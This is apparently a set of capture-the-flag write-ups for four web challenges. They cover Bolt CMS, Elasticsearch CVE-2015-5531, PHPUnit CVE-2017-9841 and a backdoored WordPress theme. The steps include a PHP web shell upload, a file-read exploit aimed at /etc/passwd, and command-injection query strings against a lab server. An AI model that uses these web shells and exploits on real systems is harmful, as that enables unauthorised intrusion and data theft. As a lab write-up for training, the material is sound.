# cybersec-labs
# bolt
Let's try: View Page Source, pay attantion to p This website is... /p, add /bolt to url and guess the user and pass.

Once you are in you need to go to file management to see if you can upload some malicious files. Let’s try to create and upload vulnerable rce.html file

click file and start editing < ?php echo system($_GET['cmd']);? >
Go to options and rename the rce.html file to rce.php

Click on rce.php
Add cmd=id
![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/df5e1a0b-ae6a-426a-b5eb-357c129ce98e)
cmd=ls-l
![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/a63d43e0-1f44-4230-8e83-630f0cfdc486)
cat /flag.txt
CTF{b12e3b34c581d4f3c66c00cc7f8dabec8838dab0acf26c2cfbe2f7d291326f75}
# elastic
![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/219165d6-3a23-41a4-8efa-ff035e7b89b1)
Hints:
Hint 1:  Elasticsearch < 1.6.1 Arbitrary file read CVE (version)

The main web page exposure the sensitive information about the version of Elasticsearch
application. 

The main of this scenario is to identify the vulnerability like in the real scenario.

Try to find an exploit

Searchable archive from The Exploit Database. https://www.exploit-db.com/

Search for remote oracle exploits for windows:
Installation:

$sudo apt install exploitdb

$sudo apt install libxml2-utils

Dependencies: libxml2-utils

$searchsploit elasticsearch

The vulnerability present in the current scenario, offers more details about 
CVE-2015-5531- Arbitrary file Vulnerability. 

Exploit can be found here:

https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py

$ python3 exploit.py URL /etc/passwd 
![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/a2ea58dc-fabc-4f50-a8ee-0ba19366d4c8)
CTF{265b92ed0091f139fdcd438196426f205fed9b14bce765bafd8344b1d96183e5}
# php unit
A website is provided as a reference to my unit is feeling a little off. So first we can try to understand php unit. For example, we can use the automatic tool Dirsearch, which brute force searches for vulnerabilities in directories.

$ dirsearch -u URL

From these addresses we can select the ones that are interesting to us like /composer.json, Here we can find version of php-unit and /eval-stding.php
Vulnerable path. Let’s check: /composer.json where we can understand that our php uni is vulnerable (CVE-2017-9841).

Now exploit the vulnerable path using Burpsuite: < ?php system('cat /flag.txt')? >
CTF{8c7795c5332da1491741a61fe780006a619273444bfe54aff555e28f83e3b123}
# nodiff-backdoor
After performing some recon using *dirsearch* on the targeted web application, we can find a *backup.zip* archive.

$ dirsearch -u URL

Download the backup file from the following url: http://34.107.45.207:30148//backup.zip 
(take note that the IP address can change based on the functionality of the CyberEDU platform.) 

In this way, we obtain the source code of the application.

$ wget http://34.107.45.207:30148//backup.zip 

Copy backup.zip to the new folder and unzip it. 

Now is time to find some backdoor. Because application use PHP code we try to search from vulnerable function in PHP:
https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720

We can try search for all the vulnerable functions. After few tries observe we got the vulnerable function (shell_exec()) in the next path: “wp-content/themes/twentytwentytwo/functions.php”

$ grep –r “shell_exec(“

Next step is to execute the backdoor to access the server base on what we got. 
If we have the parameter welldone=knockknock, then execute parameter shazam=<injection>
![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/5ed643c1-2038-4a23-ba9f-b3c823729699)
![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/5fbc856c-6241-4c2a-a001-2a9c9174004b)
Now let’s get the flag in the source of the page:
http://34.107.45.207:30148/?welldone=knockknock&shazam=id

http://34.107.45.207:30148/?welldone=knockknock&shazam=cat flag.php
CTF{87702788126237df9c4a915fea9441345dc6b3a0272b214b2c31e50a8f89c4b1}
